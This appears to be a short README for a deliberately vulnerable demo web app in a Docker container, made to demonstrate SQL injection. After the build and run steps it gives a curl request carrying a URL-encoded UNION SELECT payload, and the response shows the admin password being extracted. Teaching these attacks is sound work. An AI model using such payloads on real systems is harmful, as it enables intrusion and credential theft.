# SQL injection example

## Build container

```console
> docker build -t sqlinjection .
```

## Start container 

```console
> docker run --rm -it -p 8080:80 sqlinjection:latest
```

## Reqular request

```console
> curl 'http://localhost:8080/users/2'
{"id":2,"username":"user1"}
```

## Request user admin password

```console
> curl 'http://localhost:8080/users/%27%27%20union%20select%20id%2C%20password%20from%20users%20where%20username%20%3D%20%27admin%27'
# "http://localhost:8080/users/'' union select id, password from users where username = 'admin'"
{"id":1,"username":"secure_password_123"}
```
